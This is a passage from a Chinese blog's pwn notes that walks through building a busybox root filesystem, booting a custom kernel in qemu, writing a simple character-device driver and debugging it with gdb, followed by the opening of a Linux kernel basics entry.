sys_helloworld</code></li></ul><p>最后再编译生成新的内核即可。</p><h2 id="编译-busybox"><a href="#编译-busybox" class="headerlink" title="编译 busybox"></a>编译 busybox</h2><p>官网源码: <a href="https://busybox.net/">busybox</a></p><p>下载源码后解压进入根目录输入<code>make menuconfig</code>进行配置</p><p>在配置时进入<code>Settings</code>，勾上<code>Build static binary (no shared libs)</code>，这样就不会依赖<code>libc</code>文件。如果不勾选的话，需要自行配置libc库，这样步骤会很繁琐。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200817142246.png" alt="20200817142246"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  _install ldd bin/busybox</span><br><span class="line">    not a dynamic executable</span><br></pre></td></tr></table></figure><p>然后输入<code>make install -j8</code>进行编译，busybox 编译要比 kernel 快很多。</p><p>编译完成后会生成一个<code>_install</code>的目录，这就是我们需要的环境。</p><p>先进行一些简单的初始化:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> _install</span><br><span class="line">mkdir proc</span><br><span class="line">mkdir sys</span><br><span class="line">mkdir lib64</span><br><span class="line">mkdir -p lib/x86_64-linux-gnu/</span><br><span class="line">mkdir etc</span><br><span class="line">mkdir home</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:x:0:0:root:/root:/bin/sh&quot;</span> &gt; etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:x:0:&quot;</span> &gt; etc/group</span><br><span class="line">touch etc/shadow</span><br><span class="line">touch etc/gshadow</span><br><span class="line">touch init</span><br><span class="line">chmod +x init</span><br></pre></td></tr></table></figure><p>然后把<code>libc</code>和<code>ld</code>准备好，否则程序需要静态编译才能运行，则会使得生成的程序调试的时候不太方便。</p><p>在生成的<code>init</code>初始化脚本中，加入如下内容：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># insmod /xxx.ko # load ko</span></span><br><span class="line">mdev -s <span class="comment"># We need this to find /dev/sda later</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line"><span class="comment"># exec /bin/sh #root</span></span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure><p>然后在<code>_install</code>目录里运行下面的命令进行打包：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><p>通过上面两步，我们得到了含有<code>helloworld syscall</code>的<code>kernel</code> ,<code>bzImage</code>和用<code>busybox</code>打包的<code>fs（附带了ld和libc）</code>。</p><p>使用 qemu 启动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64  \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd rootfs.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s \</span><br><span class="line">    -smp 4,cores=2,threads=2 \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 quiet root=/dev/sda nokaslr&quot;</span></span><br></pre></td></tr></table></figure><p>这里<code>qemu-system-x86_64</code>代表是x86的64位架构</p><ul><li><p><code>-m 256M</code> 表示分配256M物理内存给该 kernel 运行, 如果内存分配不够, 那么将导致卡死</p></li><li><p><code>-cpu kvm64</code> 表示采用kvm64的cpu，同时如果要添加保护可以在这里加，如添加smep：<code>-cpu kvm64,smep</code></p></li><li><p><code>-kernel ./bzImage</code> 用于使用的内核。</p></li><li><p><code>-initrd rootfs.img</code> 用于指定选用的文件系统。</p></li><li><p><code>-nographic</code> 表示不使用图形化界面，只使用串口。</p></li><li><p><code>-s</code> 表示开启远程gdb调试，端口号为默认的1234.</p></li><li><p><code>-smp 4,cores=2,threads=2</code> 表示cpu为双核双线程。</p></li><li><p><code>-append &quot;console=ttyS0 root=/dev/sda quiet nokaslr&quot;</code> 这里代表内核启动参数</p><ul><li><code>console=ttyS0</code> 用于说明输出设备</li><li><code>nokaslr</code> 代表不开启内核地址随机化，如果要开启则输入 <code>kaslr</code> 即可</li><li><code>quiet</code> 表示静默开启</li><li><code>root=/dev/sda</code> 告诉内核硬盘上有根文件系统</li></ul></li></ul><h2 id="驱动"><a href="#驱动" class="headerlink" title="驱动"></a>驱动</h2><h3 id="register-chrdev"><a href="#register-chrdev" class="headerlink" title="register_chrdev"></a>register_chrdev</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_chrdev</span> <span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> major, <span class="keyword">const</span>  <span class="keyword">char</span> *name, struct file_operations*fops)</span></span>;</span><br></pre></td></tr></table></figure><p>在这里，我们指定要注册它的设备的名称和主要编号，之后将链接设备和<code>file_operations</code>结构。 如果我们为主参数指定零，该函数将自己分配一个主设备号（即它返回的值）。 如果返回的值为零，则表示成功，而负数表示错误。 两个设备编号均在<code>0-255</code>范围内指定。</p><p>我们将设备名称作为<code>name</code>参数的字符串值传递（如果模块注册单个设备，则此字符串也可以传递模块的名称）。 然后，我们使用此字符串来标识<code>/sys/devices</code>文件中的设备。 读取，写入和保存等设备文件操作由存储在<code>file_operations</code>结构中的函数指针处理。 这些函数由模块实现，并且指向标识该模块的<code>module</code>结构的指针也存储在<code>file_operations</code>结构中。</p><p>来自源码：<a href="https://elixir.bootlin.com/linux/latest/source/include/linux/fs.h#L1827">linux-5.8/include/linux/fs.h:1827</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">    <span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">    <span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> mmap_supported_flags;</span><br><span class="line">    <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">    <span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">    <span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">    <span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span> datasync);</span><br><span class="line">    <span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **, <span class="keyword">void</span> **);</span><br><span class="line">    <span class="keyword">long</span> (*fallocate)(struct file *file, <span class="keyword">int</span> mode, <span class="keyword">loff_t</span> offset,</span><br><span class="line">              <span class="keyword">loff_t</span> len);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="keyword">unsigned</span> (*mmap_capabilities)(struct file *);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">ssize_t</span> (*copy_file_range)(struct file *, <span class="keyword">loff_t</span>, struct file *,</span><br><span class="line">            <span class="keyword">loff_t</span>, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">loff_t</span> (*remap_file_range)(struct file *file_in, <span class="keyword">loff_t</span> pos_in,</span><br><span class="line">                   struct file *file_out, <span class="keyword">loff_t</span> pos_out,</span><br><span class="line">                   <span class="keyword">loff_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> remap_flags);</span><br><span class="line">    <span class="keyword">int</span> (*fadvise)(struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><ul><li>如果<code>file_operations</code>结构包含一些不需要的函数，您仍然可以使用该文件而不实现它们。指向未实现函数的指针可以简单地设置为零。 之后，系统将负责该功能的实现并使其正常运行</li></ul><blockquote><p>字符设备模块使用insmod加载，加载完毕需要在/dev目录下使用mkmod命令建立相应的文件结点</p></blockquote><h3 id="编写驱动程序"><a href="#编写驱动程序" class="headerlink" title="编写驱动程序"></a>编写驱动程序</h3><p>memory.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memory_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memory_release</span><span class="params">(struct inode *inode, struct file *filp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">memory_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">memory_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memory_exit</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memory_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">memory_fops</span> =</span> &#123;</span><br><span class="line">    read : memory_read,</span><br><span class="line">    write : memory_write,</span><br><span class="line">    open : memory_open,</span><br><span class="line">    release : memory_release</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">module_init(memory_init);</span><br><span class="line">module_exit(memory_exit);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> memory_major = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *memory_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> used = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memory_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line"></span><br><span class="line">    result = register_chrdev(memory_major, <span class="string">&quot;memory&quot;</span>, &amp;memory_fops);</span><br><span class="line">    <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;&lt;1&gt;memory: can&#x27;t obtain major number %d\n&quot;</span>, memory_major);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    memory_buffer = kmalloc(LENGTH, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!memory_buffer)</span><br><span class="line">    &#123;</span><br><span class="line">        result = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(memory_buffer, <span class="number">0</span>, LENGTH);</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt;Inserting memory module\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    memory_exit();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memory_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    unregister_chrdev(memory_major, <span class="string">&quot;memory&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (memory_buffer)</span><br><span class="line">        kfree(memory_buffer);</span><br><span class="line"></span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt;Removing memory module\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memory_open</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt;Open\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">memory_release</span><span class="params">(struct inode *inode, struct file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(<span class="string">&quot;&lt;1&gt;Release\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">memory_read</span><span class="params">(struct file *filp, <span class="keyword">char</span> *buf,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bytes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(used &gt; count &amp;&amp; used &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        used -= count;</span><br><span class="line">        bytes = count;</span><br><span class="line">        copy_to_user(buf, memory_buffer, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(used &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bytes = used;</span><br><span class="line">        used = <span class="number">0</span>;</span><br><span class="line">        copy_to_user(buf, memory_buffer, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">memory_write</span><span class="params">(struct file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buf,</span></span></span><br><span class="line"><span class="params"><span class="function">                     <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> *f_pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> bytes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(used + count &lt; LENGTH)</span><br><span class="line">    &#123;</span><br><span class="line">        used += count;</span><br><span class="line">        bytes = count;</span><br><span class="line">        copy_from_user(memory_buffer, buf, bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(used &lt; LENGTH)</span><br><span class="line">    &#123;</span><br><span class="line">        bytes = LENGTH - used;</span><br><span class="line">        used = LENGTH;</span><br><span class="line">        copy_from_user(memory_buffer, buf, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的驱动可以看成一个简单的字符仓库，如果放满了字符就放不进去，如果是空的也拿不出来。</p><p>驱动源码并不能用<code>gcc</code>直接进行编译，需要生成一个<code>Makefile</code>来进行编译。</p><p>Makefile:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ARGET_MODULE:=memorys</span><br><span class="line">PWD:=$(shell <span class="built_in">pwd</span>)</span><br><span class="line"><span class="comment"># KERNELDIR := /lib/modules/$(shell uname -r)/build</span></span><br><span class="line">KERNELDIR:=./linux-4.15</span><br><span class="line"></span><br><span class="line">$(TARGET_MODULE)-objs := memory.o</span><br><span class="line">obj-m := $(TARGET_MODULE).o</span><br><span class="line"></span><br><span class="line">all:</span><br><span class="line">    $(MAKE) -C $(KERNELDIR) M=$(PWD) modules</span><br><span class="line"></span><br><span class="line">clean:  </span><br><span class="line">    rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions *.order *.symvers</span><br></pre></td></tr></table></figure><blockquote><p>对应的内核要编译相对应的驱动才能载入，否则会失败。</p></blockquote><p>编译好会生成一个<code>memorys.ko</code>的驱动。</p><p>时我们可以把驱动复制到<code>_install</code>根目录，然后在我们的<code>init</code>脚本中加入下面两条命令，重新生成镜像。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">insmod /memorys.ko</span><br><span class="line">mknod /dev/memorys c 60 0</span><br></pre></td></tr></table></figure><blockquote><p>60 为我们设置的主设备号</p></blockquote><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>qemu 内置有 gdb 的接口, 通过 help 命令进行查看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ qemu-system-x86_64 --<span class="built_in">help</span> | grep gdb</span><br><span class="line">-gdb dev        <span class="built_in">wait</span> <span class="keyword">for</span> gdb connection on <span class="string">&#x27;dev&#x27;</span></span><br><span class="line">-s              shorthand <span class="keyword">for</span> -gdb tcp::1234</span><br></pre></td></tr></table></figure><p>即可以通过 <code>-gdb tcp:port</code> 或者 <code>-s</code> 来开启调试端口, 可以写入<code>start.sh</code>中, 接着就可以在<code>gdb</code>使用<code>target remote localhost:1234</code>进行连接了, <strong>注意, 后者会使虚拟机启动时强制终端等待调试器连接</strong> (因为我曾傻傻的加入以后没有连接gdb…..然后在那里傻等😂)</p><p>一般来说加<code>nokaslr</code>把<code>kaslr</code>关了调试起来会方便一些。否则<code>gdb</code>将找不到<code>ELF</code>基地址（毕竟不是本地）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-append <span class="string">&quot;console=ttyS0 nokaslr&quot;</span></span><br></pre></td></tr></table></figure><p>但通过 <code>gdb ./vmlinux</code> 启动时,虽然加载了 kernel 的符号表, 但没有加载 LKMs 的<code>.text, .bss,.data</code>等节区的地址, 此时可以通过 <code>add-symbol-file LKMs(模块名) textaddr(text段地址) -s .bss bssaddr(bss段地址)</code> 加载</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">help</span> add-symbol-file</span><br><span class="line">Load symbols from FILE, assuming FILE has been dynamically loaded.</span><br><span class="line">Usage: add-symbol-file FILE ADDR [-s &lt;SECT&gt; &lt;SECT_ADDR&gt; -s &lt;SECT&gt; &lt;SECT_ADDR&gt; ...]</span><br><span class="line">ADDR is the starting address of the file<span class="string">&#x27;s text.</span></span><br><span class="line"><span class="string">The optional arguments are section-name section-address pairs and</span></span><br><span class="line"><span class="string">should be specified if the data and bss segments are not contiguous</span></span><br><span class="line"><span class="string">with the text.  SECT is a section name to be loaded at SECT_ADDR.</span></span><br></pre></td></tr></table></figure><p>不过要注意的是,我们加载到内核的模块名不一定是模块文件的名字,可以使用 lsmod 命令查看。</p><p>一般这些模块的地址都可以通过 <code>/sys/modules/*</code> 来查看,以<code>core</code>模块的<code>.text</code>为例子<code>grep 0x /sys/modules/core/section/.text</code></p><p>一般来说, 查看需要 root 权限, 所以可以修改<code>init</code>以获得 root 权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure><p>重新打包,这样启动的时候就是 root 权限了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="%5Bhttps://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/%5D(https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/)">Kernel 环境配置</a></p><p><a href="http://blog.eonew.cn/archives/1162">Linux kernel 初探</a></p><p><a href="https://nuoye-blog.github.io/2020/08/21/dcb8d699/">kernel环境搭建</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Kernel Basics</title>
      <link href="/note-pwn-kernel-basics/"/>
      <url>/note-pwn-kernel-basics/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h2><p>Kernel 也是一个程序, 主要功能有两点</p><ol><li>控制并与硬件交互</li><li>提供应用能运行的环境</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20200711220143544.png" alt="image-20200711220143544"></p><p><strong>需要注意的是kernel的crash通常会引起重启</strong></p><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>Intel CPU 将 CPU 的特权级别分为4个: <code>Ring 0</code>, <code>Ring 1</code>, <code>Ring 2</code>, <code>Ring 3</code></p><ul><li><code>Ring 0</code>只给OS使用</li><li><code>Ring 3</code>所有程序都可以用</li><li>内层Ring可以随意使用外层Ring资源</li><li>在<code>Ring 0</code>下,可以修改用户的权限（也就是提权）</li><li>大多数现代操作系统只用到了<code>Ring 0</code>和<code>Ring 3</code></li></ul><h2 id="Loadable-Kernel-Modules-LKMs"><a href="#Loadable-Kernel-Modules-LKMs" class="headerlink" title="Loadable Kernel Modules (LKMs)"></a>Loadable Kernel Modules (LKMs)</h2><p>可加载核心模块(或直接称为内核模块) 就像运行在内核空间的可执行程序,包括</p><ul><li>驱动程序(<code>Device drivers</code>)<ul><li>设备驱动</li><li>文件系统驱动</li><li>….</li></ul></li><li>内核扩展模块(<code>modules</code>)</li></ul><p>LKMs的文件格式和用户态的可执行程序相同,Linux下为ELF,Windows下为EXE/DLL , mac下为MACH-O,因此可以用IDA等工具来分析内核模块, 文件后缀一般为<code>.ko</code></p><p>模块可以被单独编译,但不能单独运行。它在运行是被链接到内核作为内核的一部分在内核空间运行,这与运行用户空间的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制,是以为它本身是一个单内核。单内核的优点是效率搞,因为所有内容都集合在一起,但缺点是可扩展性和可维护性相对较差,模块机制就是为了弥补这一缺陷。</p></blockquote><h3 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h3><ul><li><strong>insmod</strong> : 将指定模块加载到内核中</li><li><strong>rmmod</strong> : 从内核中卸载指定模块</li><li><strong>lsmod</strong> : 列出已加载模块</li><li><strong>modprobe</strong> : 添加或删除模块,modprobe在加载模块是会查找依赖关系</li></ul><blockquote><p>大多数 CTF 中的 kernel vulnerability 也出现在 LKM 中</p></blockquote><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用,指用户空间的程序向操作系统内核请求需要更高权限的服务,例如IO操作或者进程间通讯。系统调用提供用户程序与操作系统间的接口,部分库函数（如 scanf , puts等IO相关的函数实际上是对系统调用(<code>read</code> 和 <code>write</code>) 的封装。</p><blockquote><p>在 <code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code> 和 <code>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</code> 分别可以查看64位和32位的系统调用号</p><ul><li><a href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a>,可以查阅 32 位系统调用对应的寄存器含义以及源码。</li><li>64 位系统调用可以查看 <a href="https://syscalls64.paolostivanin.com/">Linux Syscall64 Reference</a></li></ul></blockquote><h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><p>系统调用,用于与设备通信</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man ioctl</span><br></pre></td></tr></table></figure><p> 直接查看man手册</p><p><code>int ioctl(int fd, unsigned long request, ...)</code>的第一个参数为打开设备(open)返回的<a href="%5Bhttps://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%5D(https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6)">文件描述符</a>, 第二个参数为用户程序对设备的控制命令,再后边的参数则是一些补充参数,与设备有关。</p><blockquote><p>使用 ioctl 